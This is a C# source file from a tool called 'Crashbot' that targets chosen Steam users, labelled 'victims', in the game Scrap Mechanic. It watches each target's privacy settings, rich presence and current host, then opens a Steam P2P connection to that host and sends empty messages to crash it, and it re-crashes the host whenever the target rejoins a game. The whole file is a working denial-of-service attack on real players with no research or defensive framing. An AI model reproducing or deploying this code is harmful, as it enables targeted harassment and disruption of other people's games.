using Crashbot.Steam;
using Crashbot.Util;
using Steamworks;
using System.Collections.Concurrent;
using System.Security.Cryptography;
using System.Text;
using static Crashbot.Steam.Victim;

namespace Crashbot
{
    public class SteamInterface
    {
        private static readonly SteamNetworkingConfigValue_t[] LongTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutConnected,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 500 }
            },
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = int.MaxValue }
            }
        ];

        private static readonly SteamNetworkingConfigValue_t[] ConnectionTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 800 }
            }
        ];

        private const int FUN_TIME = 3;
        private const int REQUEST_TIMEOUT = 1000;
        private readonly SteamThread SteamThread;
        private readonly InterfaceMode OperationMode;
        private static readonly AppId_t GAMEID = new(387990);
        private readonly ConcurrentDictionary<CSteamID, Victim> SteamUsers = [];
        private static readonly ConcurrentBag<Task<SteamInterface>> steamInterfaceThreads = [];

        private SteamInterface(InterfaceMode operation)
        {
            this.OperationMode = operation;
            this.SteamThread = new SteamThread(operation);
        }

        /// <summary>
        /// Creates a new steam interface in a detached thread.
        /// </summary>
        /// <returns></returns>
        public static SteamInterface NewAsyncInterface()
            => new(InterfaceMode.Asyncronous);

        /// <summary>
        /// Creates a new steam interface for use in the current thread.
        /// </summary>
        /// <returns></returns>
        public static SteamInterface NewSyncInterface()
            => new(InterfaceMode.Syncronous);

        /// <summary>
        /// Adds a new victim for auto-crashing
        /// </summary>
        /// <param name="steamid"></param>
        /// <returns></returns>
        public Victim AddNewVictim(ulong steamid)
        {
            var vic = new Victim(new(steamid));
            this.AddNewVictim(vic);
            return vic;
        }

        /// <summary>
        /// Adds a new victim for auto-crashing
        /// </summary>
        /// <param name="victim"></param>
        /// <returns></returns>
        public bool AddNewVictim(Victim victim)
        {
            bool res = this.SteamUsers.TryAdd(victim.SteamId, victim);
            this.CrashVictimWhenReady(victim);
            return res;
        }

        /// <summary>
        /// Removes victim and stops tracking and crashing
        /// </summary>
        /// <param name="v"></param>
        public void RemoveVictim(Victim v)
        {
            if (this.SteamUsers.TryRemove(v.SteamId, out var SteamUser))
                SteamUser.Interupt.Interupt(1000);
        }

        /// <summary>
        /// Waits until steam has initialized
        /// </summary>
        public void WaitUntilSteamReady()
        {
            while (!this.SteamThread.SteamIsReady)
                Task.Delay(1).Wait();
        }

        internal string LoadVictimName(Victim victim)
        {
            string name = this.LoadVictimName(victim.SteamId);
            victim.OnNameLoaded(name);
            return name;
        }

        internal void GetVictimRichPresence(Victim victim)
            => this.GetVictimRichPresence(victim.SteamId);

        internal void CrashVictimWhenReady(Victim v)
        {
            if (this.SteamUsers.TryGetValue(v.SteamId, out var victim))
            {
                AutoResetEvent Step = new(false);

                void onSettingsLoaded(PrivacyState _)
                {
                    Step.Set();
                    victim.PrivacySettingsChanged -= onSettingsLoaded;
                };
                victim.PrivacySettingsChanged += onSettingsLoaded;

                victim.StartTracking();
                string name = this.LoadVictimName(victim);
                Logger.WriteLine($"Targeting '{name}'", Verbosity.Normal);

                Step.WaitOne();

                Logger.WriteLine($"Now watching {name} ({v.SteamId})...", Verbosity.Normal);

                if (victim.PrivacySettings == PrivacyState.Public)
                {
                    this.CrashPublicClient(victim);
                    return;
                }

                this.CrashPrivateClient(victim);
            }
        }

        private void CrashPrivateClient(Victim victim)
        {
            // Direct connection, ocasionaly check if the profile is public
            this.CrashClientAsync(victim, victim.Interupt);

            victim.PrivacySettingsChanged += _ =>
            {
                if (victim.PrivacySettings == PrivacyState.Public)
                {
                    victim.Interupt.Interupt(1000);
                    this.CrashPublicClient(victim);
                }
            };
        }

        private void CrashPublicClient(Victim victim)
        {
            // wait for RP and fast track
            bool previousState = !victim.IsPlayingScrapMechanic;
            void onGameChange(bool isPlaying)
            {
                victim.Interupt.Reset();
                if (isPlaying) this.CrashClientAsync(victim, victim.Interupt);
            };

            victim.GetRichPresence += (_, _) => this.GetVictimRichPresence(victim);
            victim.StartCollectRichPresence();

            victim.GameStateChanged += onGameChange;
            victim.FasterTracking(new CancellationTokenSource().Token);

            victim.HostSteamIdChanged += _ =>
            {
                victim.Interupt.Reset();
                this.CrashClientAsync(victim, victim.Interupt);
            };

            victim.PrivacySettingsChanged += _ =>
            {
                if (victim.PrivacySettings != PrivacyState.Public)
                {
                    victim.Interupt.Reset(1000);
                    this.CrashPublicClient(victim);
                }
            };

            onGameChange(victim.IsPlayingScrapMechanic);
        }

        private void CrashClientAsync(Victim mega_victim, InteruptHandler interuptSource)
            => Task.Run(() => this.CrashClient(mega_victim, interuptSource));

        private void CrashClient(Victim mega_victim, InteruptHandler interuptSource)
        {
            if (!mega_victim.IsCrashing)
            {
                Logger.WriteLine($"Preparing to crash host {mega_victim.HostSteamId} for victim {mega_victim.SteamId}", Verbosity.Verbose);
               
                SteamNetworkingIdentity remoteIdentity = new();
                interuptSource.Register();
                mega_victim.IsCrashing = true;
                remoteIdentity.SetSteamID(mega_victim.HostSteamId);

                var (cx, ix) = this.SteamThread.ConnectP2PAsync(ref remoteIdentity, 0, LongTimeoutOptions.Length, LongTimeoutOptions, interuptSource.Token);

                if (cx is null || ix is null)
                {
                    mega_victim.IsCrashing = false;
                    interuptSource.Completed();
                    Logger.WriteLine($"Exiting early, likely due to token cancelation: {interuptSource.WasInterupted}", Verbosity.Debug);
                    return;
                }

                SteamNetConnectionInfo_t info = ix.Value;
                HSteamNetConnection conn = cx.Value;

                // Wait for 1 msg or 2 seconds
                CancellationTokenSource cancellationTokenSource = new();

                Task.Run(() => SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, new nint[1], 1), cancellationTokenSource.Token).ContinueWith(_ =>
                {
                    for (int i = 0; i < FUN_TIME; i++)
                    {
                        this.SteamThread.SendMessageToConnection(conn, [], 0, 0);
                        this.SteamThread.Get(SteamNetworkingSockets.FlushMessagesOnConnection, conn);
                        Task.Delay(20).Wait();
                    }

                    mega_victim.OnVictimCrashed();
                    Logger.WriteLine($"Crashed host ({mega_victim.HostSteamId}) for victim ({mega_victim.SteamId})", Verbosity.Verbose);

                    while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally)
                        this.SteamThread.GetConnectionInfo(conn, out info);

                    mega_victim.IsCrashing = false;
                    interuptSource.Completed();
                });

                Task.Delay(5000).ContinueWith(_ => cancellationTokenSource.Cancel());
            }
        }

        private string LoadVictimName(CSteamID steamid)
        {
            bool infoIsPreLoaded = this.SteamThread.Get(SteamFriends.RequestUserInformation, steamid, true);

            if (!infoIsPreLoaded)
            {
                AutoResetEvent nameLoaded = new(false);
                Callback<PersonaStateChange_t>.Create(_ => nameLoaded.Set());
                nameLoaded.WaitOne(REQUEST_TIMEOUT);
            }

            return this.SteamThread.Get(SteamFriends.GetFriendPersonaName, steamid)!;
        }

        private void GetVictimRichPresence(CSteamID steamid)
        {
            var id = this.SteamThread.RegisterCallbackOnce((FriendRichPresenceUpdate_t result) =>
            {
                if (result.m_steamIDFriend.m_SteamID == steamid.m_SteamID && this.SteamUsers.TryGetValue(steamid, out var victim))
                {
                    var currentRP = this.LoadUserRP(victim.SteamId);
                    victim.OnRichPresenceUpdate(currentRP);
                    return true;
                }

                return false;
            });

            SteamFriends.RequestFriendRichPresence(steamid);

            Task.Delay(REQUEST_TIMEOUT * 15)
                .ContinueWith(_ => this.SteamThread.ForceCallOnce(id, new() { m_steamIDFriend = steamid, m_nAppID = GAMEID }));
        }

        private Dictionary<string, string> LoadUserRP(CSteamID user)
        {
            Dictionary<string, string> richPresence = [];

            int keyCount = SteamFriends.GetFriendRichPresenceKeyCount(user);

            if (keyCount > 0)
            {
                for (int i = 0; i < keyCount; i++)
                {
                    string key = SteamFriends.GetFriendRichPresenceKeyByIndex(user, i)!;
                    string value = SteamFriends.GetFriendRichPresence(user, key)!;
                    richPresence.Add(key, value);
                }
            }

            return richPresence;
        }

        private static ulong HashRichPresence(string richPresence)
        {
            byte[] hash = SHA512.HashData(Encoding.UTF8.GetBytes(richPresence));
            return BitConverter.ToUInt64(hash, 0);
        }
    }
}
